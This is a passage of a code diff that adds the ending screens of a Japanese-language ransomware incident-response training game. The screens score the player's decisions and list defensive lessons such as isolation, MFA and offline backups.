+  }).join('');
+  const explain = scoreVal >= 4 ? '早期対応で被害を大幅に抑制しました' :
+                  scoreVal >= 2 ? '一部の対応が遅れ、被害が拡大しました' :
+                                  'ほとんどの対応が遅れ、甚大な被害となりました';
+  return '<div class="score-badge">' +
+    '<div class="grade-lbl" style="color:' + gradeObj.c + '">' + gradeObj.g + '</div>' +
+    '<div class="grade-sub">判断スコア ' + scoreVal + ' / ' + maxScore + ' 正しい対応</div>' +
+    '<div class="grade-steps">' + dots + '</div>' +
+    '<div class="grade-explain">' + explain + '</div>' +
+    '</div>';
+}
+
+function showSuccess() {
+  document.getElementById('end-screen').style.display = 'flex';
+  const sc = document.getElementById('success-card');
+  sc.style.display = 'block';
+
+  const grade = score >= 5 ? {g:'S', c:'var(--green)'} : {g:'A', c:'var(--cyan)'};
+
+  sc.innerHTML = `
+    <h2>🛡 攻撃を完全に阻止しました</h2>
+    <div style="background:rgba(52,211,153,0.08);border:1px solid rgba(52,211,153,0.3);padding:18px;border-radius:3px;margin-bottom:20px;">
+      <div style="font-size:14px;line-height:1.9;color:#6ee7b7;">
+        <b>データ流出: なし</b><br>
+        <b>ファイル暗号化: なし</b><br>
+        <b>業務停止: 最小限（調査期間のみ）</b><br>
+        <b>身代金支払い: 不要</b>
+      </div>
+    </div>
+    <div style="font-size:14px;line-height:1.9;color:var(--text);margin-bottom:20px;border-top:1px solid var(--border);padding-top:16px;">
+      初期侵入（フィッシング）から攻撃を的確に封じ込めました。<b>PC隔離 → 認証情報リセット → ネットワーク隔離</b>という連続した判断が、ランサムウェアの発動を未然に防いだ教科書的な対応です。<br><br>
+      今後は侵入経路の詳細なフォレンジック分析と、MFAの全面導入を優先してください。
+    </div>
+    ${buildScoreBadge(score, MAX_SCORE, grade)}
+    <div class="result-lessons">
+      <h3>今回うまくいった対策</h3>
+      <ul>
+        <li><b>即時のPC隔離</b> — 感染端末をネットワークから切り離し、C2通信を遮断した</li>
+        <li><b>認証情報のリセット</b> — 奪取された可能性のあるアカウントを早期に無効化した</li>
+        <li><b>ネットワーク隔離</b> — セグメント分離で横断拡散を物理的に阻止した</li>
+        <li><b>継続的な監視</b> — 複数のアラートを見逃さず連続して対応した</li>
+      </ul>
+    </div>
+    <div class="result-lessons" style="margin-top:16px;">
+      <h3>さらなる改善ポイント</h3>
+      <ul>
+        <li><b>MFA（多要素認証）</b> — 認証情報を奪われても侵入を防ぐ最重要対策</li>
+        <li><b>オフライン不変バックアップ</b> — ネットワークから切り離した3-2-1バックアップ</li>
+        <li><b>フィッシング訓練</b> — 社員の類似ドメイン・マクロ有効ファイルへの意識向上</li>
+      </ul>
+    </div>
+    <button class="btn-retry" onclick="location.reload()">▶ もう一度プレイする</button>
+  `;
+}
+
+// ══ 被害エンド（身代金選択後） ═══════════════════════════════
+function endGame(choice) {
+  document.getElementById('ransom-note').style.display = 'none';
+  const card = document.getElementById('result-card');
+  card.style.display = 'block';
+
+  const grade = score >= 4 ? {g:'B', c:'var(--orange)'} :
+                score >= 2 ? {g:'C', c:'var(--red)'}    :
+                             {g:'D', c:'#a0a0a0'};
+
+  const finalSI = Math.min(100, stats.si + (choice==='pay'?25:35));
+  const finalRT = choice==='pay' ? stats.rt : Math.max(0, stats.rt-15);
+  const finalBR = choice==='pay' ? Math.max(0, stats.br-85) : stats.br;
+  const downtime = state.p4_net_isolated ? (score>=3?'1〜2週間':'2〜3週間') : (score>=2?'3〜4週間':'4〜8週間');
+  const cost     = state.p4_net_isolated ? (score>=3?'約500〜1,000万円':'約1,000〜2,000万円') : (score>=2?'約3,000万円':'約5,000〜1億円');
+
+  const siC = finalSI>60?'var(--green)':finalSI>30?'var(--orange)':'var(--red)';
+  const rtC = finalRT>60?'var(--cyan)':finalRT>30?'var(--orange)':'var(--red)';
+  const brC = finalBR>60?'var(--orange)':finalBR>30?'var(--yellow)':'var(--red)';
+
+  card.innerHTML = `
+    <h2 style="color:${choice==='pay'?'var(--orange)':'var(--green)'}">
+      ${choice==='pay' ? '結果: 身代金を支払った' : '結果: 支払わずに自力復旧へ'}
+    </h2>
+    <div class="r-kpi-row">
+      <div class="r-kpi">
+        <div class="r-kpi-icon">🖥️</div>
+        <div class="r-kpi-name">システム復旧度</div>
+        <div class="r-kpi-sub">業務システムの回復状況</div>
+        <div class="r-kpi-bar-wrap"><div class="r-kpi-bar" style="width:${finalSI}%;background:${siC}"></div></div>
+        <div class="r-kpi-val" style="color:${siC}">${finalSI}%</div>
+      </div>
+      <div class="r-kpi">
+        <div class="r-kpi-icon">🏢</div>
+        <div class="r-kpi-name">組織信頼度</div>
+        <div class="r-kpi-sub">顧客・取引先からの信頼</div>
+        <div class="r-kpi-bar-wrap"><div class="r-kpi-bar" style="width:${finalRT}%;background:${rtC}"></div></div>
+        <div class="r-kpi-val" style="color:${rtC}">${finalRT}%</div>
+      </div>
+      <div class="r-kpi">
+        <div class="r-kpi-icon">💴</div>
+        <div class="r-kpi-name">予算残存率</div>
+        <div class="r-kpi-sub">対応・復旧コスト後の残余</div>
+        <div class="r-kpi-bar-wrap"><div class="r-kpi-bar" style="width:${finalBR}%;background:${brC}"></div></div>
+        <div class="r-kpi-val" style="color:${brC}">${finalBR}%</div>
+      </div>
+    </div>
+    <div class="result-text">
+      ${choice==='pay'
+        ? `身代金を支払い、約${state.p4_net_isolated?'1〜2週間':'3週間'}後に復号ツールを受け取りました。ただし全ファイルの完全復旧には至らず、一部データは永久に失われました。<b>支払い企業は攻撃者のリストに「支払う組織」として登録され、再攻撃リスクが大幅に高まります。</b>流出したデータ（${state.exfil_mb}MB）はすでにダークウェブに一部掲載されていました。`
+        : `身代金の支払いを拒否しました。バックアップが削除されているため復旧に${downtime}を要し、復旧費用は${cost}規模です。${finalRT>50?'早期の部分的な対応が功を奏し、顧客・取引先への影響は最小限に抑えられました。':'流出データ（'+state.exfil_mb+'MB）が公開されており、顧客・取引先への通知対応が必要です。'}<b>長期的には信頼回復の余地があります。</b>`
+      }
+    </div>
+    ${buildScoreBadge(score, MAX_SCORE, grade)}
+    <div class="result-lessons">
+      <h3>このインシデントから学ぶ対策</h3>
+      <ul>
+        <li><b>MFAの全面導入</b> — 業務システム・VPNのログインに多要素認証を必須にする</li>
+        <li><b>オフライン不変バックアップ</b> — ネットワークから切り離した3-2-1バックアップを定期テストする</li>
+        <li><b>EDR / NDRの導入</b> — エンドポイントとネットワーク双方の異常を24時間検知する</li>
+        <li><b>最小権限の原則</b> — 管理者権限を必要最小限に絞り、サービスアカウントを分離する</li>
+        <li><b>インシデント対応訓練</b> — 発生前にIRPを整備し、定期的に対応演練を実施する</li>
+        <li><b>フィッシング教育</b> — 類似ドメイン・マクロ有効ファイルへの注意を全社員に徹底する</li>
+      </ul>
+    </div>
+    <button class="btn-retry" onclick="location.reload()">▶ もう一度プレイする</button>
+  `;
+}
+</script>
+</body>
+</html>
